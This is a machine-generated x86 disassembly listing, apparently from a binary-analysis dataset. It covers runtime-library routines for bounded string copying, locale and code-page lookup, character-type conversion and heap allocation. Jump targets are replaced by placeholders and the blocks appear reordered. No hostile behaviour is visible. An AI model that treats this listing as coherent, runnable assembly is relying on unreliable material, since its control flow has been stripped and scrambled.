push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100334d1
add esp 0x18
pop ebp
retn
sub_10033695
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp eax ebx
je r-xdata
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx eax
mov [ eax ] bl
jmp r-xdata
cmp edi ebx
je r-xdata
inc edx
dec edi
jne r-xdata
mov cl [ esi ]
mov [ edx ] cl
inc edx
inc esi
cmp cl bl
je r-xdata
cmp [ edx ] bl
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ eax ] bl
call sub_1002972b
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
sub_10033709
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
jne r-xdata
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ esi ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov eax esi
jne r-xdata
mov [ esi ] bl
jmp r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
mov cl [ edx ]
mov [ eax ] cl
inc eax
inc edx
cmp cl bl
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ eax ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
jmp r-xdata
mov [ esi ] bl
call sub_1002972b
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
push 0x50
mov [ esi + eax - 0x1 ] bl
pop eax
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
sub_100337be
mov edi edi
push ebp
mov ebp esp
xor eax eax
push ebx
xor ebx ebx
inc eax
cmp [ ebp + 0xc ] ebx
jl r-xdata
xor ecx ecx
test eax eax
sete cl
pop ebx
mov eax ecx
pop ebp
retn
push esi
push edi
pop edi
pop esi
mov eax [ ebp + 0xc ]
add eax ebx
cdq
sub eax edx
mov esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
lea edi [ eax + esi * 8 ]
push [ edi ]
mov eax [ ebp + 0x10 ]
push [ eax ]
call sub_10037835
pop ecx
pop ecx
test eax eax
jne r-xdata
jge r-xdata
mov ecx [ ebp + 0x10 ]
add edi 0x4
mov [ ecx ] edi
jmp r-xdata
lea ebx [ esi + 0x1 ]
dec esi
mov [ ebp + 0xc ] esi
jmp r-xdata
cmp ebx [ ebp + 0xc ]
jle r-xdata
test eax eax
je r-xdata
sub_10033820
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
test esi esi
je r-xdata
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push r--data
push eax
call sub_100276a0
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
lea esi [ ebp - 0xc ]
call [ GetACP@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
push r--data
push esi
call sub_100276a0
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
call sub_10037887
pop ecx
push 0x8
lea eax [ ebp - 0xc ]
push eax
push 0xb
push [ edi + 0x1c ]
call [ GetLocaleInfoA@IAT ]
test eax eax
je r-xdata
sub_100338c4
mov edi edi
push ebp
mov ebp esp
xor eax eax
xor eax eax
pop ebp
retn
inc eax
inc eax
cmp eax 0x14
jb r-xdata
mov cx [ ebp + 0x8 ]
cmp cx [ eax + r--data ]
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_100338e8
mov edi edi
push esi
xor esi esi
jmp r-xdata
mov cl [ edx ]
test cl cl
jne r-xdata
mov al cl
sub al 0x61
inc edx
cmp al 0x5
ja r-xdata
mov eax esi
pop esi
retn
mov al cl
sub al 0x41
cmp al 0x5
ja r-xdata
add cl 0xd9
jmp r-xdata
movsx eax cl
shl esi 0x4
lea esi [ esi + eax - 0x30 ]
add cl 0xf9
sub_1003391c
xor eax eax
sub cl 0x61
cmp cl 0x19
ja r-xdata
cmp cl 0x5a
jle r-xdata
retn
inc eax
jmp r-xdata
mov cl [ edx ]
inc edx
cmp cl 0x41
jl r-xdata
sub_10033937
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002bd74
mov esi eax
mov edx edi
add esi 0x9c
call sub_100338e8
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10037835
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push edi
call sub_100338c4
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_100242d7
leave
retn 0x4
or [ esi + 0x8 ] 0x4
mov [ esi + 0x1c ] edi
mov [ esi + 0x18 ] edi
sub_100339cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0x3ff
push 0x1
or eax 0x400
push eax
mov esi ecx
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x7c ]
call sub_100338e8
cmp [ ebp + 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_100242d7
leave
retn
mov esi [ esi ]
push edi
mov edx esi
call sub_1003391c
push esi
mov edi eax
call sub_10024630
pop ecx
cmp edi eax
pop edi
je r-xdata
sub_10033a43
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002bd74
mov esi eax
mov edx edi
add esi 0x9c
call sub_100338e8
mov ebx [ GetLocaleInfoA@IAT ]
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x14 ]
neg eax
sbb eax eax
and eax 0xfffff005
add eax 0x1002
push eax
push edi
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi + 0x4 ]
call sub_10037835
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
mov eax 0x300
and ecx eax
cmp ecx eax
je r-xdata
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call ebx
test eax eax
je r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10037835
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10037835
pop ecx
xor ebx ebx
pop ecx
test eax eax
jne r-xdata
test [ esi + 0x8 ] 0x2
jne r-xdata
or [ esi + 0x8 ] 0x304
mov [ esi + 0x18 ] edi
jmp r-xdata
cmp [ esi + 0x10 ] ebx
jne r-xdata
or [ esi + 0x8 ] 0x200
mov eax [ esi + 0x8 ]
cmp [ esi + 0x10 ] ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
mov [ esi + 0x1c ] edi
cmp [ esi + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
je r-xdata
or eax 0x100
mov [ esi + 0x8 ] eax
jmp r-xdata
mov edx [ esi + 0x8 ]
test dl 0x1
jne r-xdata
push eax
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_1003798f
add esp 0xc
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10037835
pop ecx
pop ecx
test eax eax
jne r-xdata
or [ esi + 0x8 ] 0x100
push [ esi ]
call sub_10024630
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
push edi
call sub_100338c4
pop ecx
test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_10024630
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_100339cf
pop ecx
pop ecx
test eax eax
je r-xdata
sub_10033c15
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_1002bd74
mov esi eax
mov edx edi
add esi 0x9c
call sub_100338e8
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10037835
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_100242d7
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_10037835
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_100339cf
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_10033cd6
push [ esi ]
call sub_10024630
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_10024630
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_1003391c
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_10033a43
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_10033d3d
push [ esi ]
call sub_10024630
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_1003391c
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_10033c15
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_10033d79
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_1002bd74
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_100337be
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_10033820
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_10024630
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_10033937
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_10033d3d
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_100337be
add esp 0xc
test eax eax
je r-xdata
call sub_10033cd6
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_10033d3d
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_10033cd6
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_1002a20e
add esp 0x10
sub_10033f6a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
xor ebx ebx
push edi
mov edi ecx
cmp eax ebx
jne r-xdata
cmp eax 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
xor esi esi
inc esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
xor esi esi
cmp [ ebp + 0x1c ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
jmp r-xdata
cmp [ ebp + 0x18 ] ebx
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x14 ]
mov [ ebp + 0x1c ] eax
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x1c ]
call sub_10034270
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
xor eax eax
jmp r-xdata
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x20 ] ebx
push ebx
push ebx
push [ ebp + 0x10 ]
setne al
push [ ebp + 0xc ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x18 ]
call esi
mov edi eax
cmp edi ebx
je r-xdata
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x18 ] eax
cmp eax [ ebp + 0x18 ]
je r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
jle r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp + 0x1c ]
call [ GetStringTypeA@IAT ]
mov edi eax
cmp esi ebx
je r-xdata
push ebx
push ebx
lea ecx [ ebp + 0x10 ]
push ecx
push [ ebp + 0xc ]
push eax
push [ ebp + 0x18 ]
call sub_100342b9
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
test ebx ebx
je r-xdata
cmp edi 0x7ffffff0
ja r-xdata
mov eax edi
push esi
call sub_10024aba
pop ecx
mov [ ebp + 0xc ] esi
lea eax [ edi + edi ]
push eax
push 0x0
push ebx
call sub_10024b80
add esp 0xc
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_10029bcd
mov eax [ ebp - 0x8 ]
pop ecx
jmp r-xdata
push [ ebp + 0x14 ]
push eax
push ebx
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
mov [ ebp - 0x8 ] eax
push eax
call sub_100272fd
pop ecx
cmp eax ebx
je r-xdata
call sub_10034470
mov eax esp
cmp eax ebx
je r-xdata
mov ebx eax
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
add eax 0x8
sub_10034124
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_10033f6a
add esp 0x1c
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10034166
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_10034230
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
mov edi edi
add edx 0x1
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_10034270
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_10037887
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
sub_100342b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_100242d7
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_10024b80
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_10029bcd
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_100272fd
pop ecx
cmp eax edi
je r-xdata
call sub_10034470
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_10024630
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_1002a045
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_10024aba
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_1003449c
push 0xc
push r--data
call sub_1002ca38
mov ecx [ ebp + 0x8 ]
xor edi edi
cmp ecx edi
jbe r-xdata
imul ecx [ ebp + 0xc ]
mov esi ecx
mov [ ebp + 0x8 ] esi
cmp esi edi
jne r-xdata
push 0xffffffe0
pop eax
xor edx edx
div ecx
cmp eax [ ebp + 0xc ]
sbb eax eax
inc eax
jne r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
cmp esi 0xffffffe0
ja r-xdata
xor esi esi
inc esi
call sub_1002972b
mov [ eax ] 0xc
push edi
push edi
push edi
push edi
push edi
call sub_1002480c
add esp 0x14
cmp ebx edi
jne r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
call sub_1002ca7d
retn
mov eax ebx
cmp [ rw-data ] edi
je r-xdata
cmp ebx edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
ja r-xdata
cmp ebx edi
jne r-xdata
push esi
call sub_1002b638
pop ecx
test eax eax
jne r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ebx eax
push 0x4
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call sub_1002d9c2
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10034598
mov ebx [ ebp - 0x1c ]
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax edi
je r-xdata
push [ ebp + 0x8 ]
push edi
push ebx
call sub_10024b80
add esp 0xc
mov [ eax ] 0xc
xor eax eax
jmp r-xdata
mov [ eax ] 0xc
jmp r-xdata
sub_100345ba
push 0x10
push r--data
call sub_1002ca38
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_100272fd
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_10024aba
pop ecx
jmp r-xdata
call sub_1002ca7d
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_1002b638
pop ecx
call sub_1002972b
push 0x4
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_1002d1e3
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100346fe
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
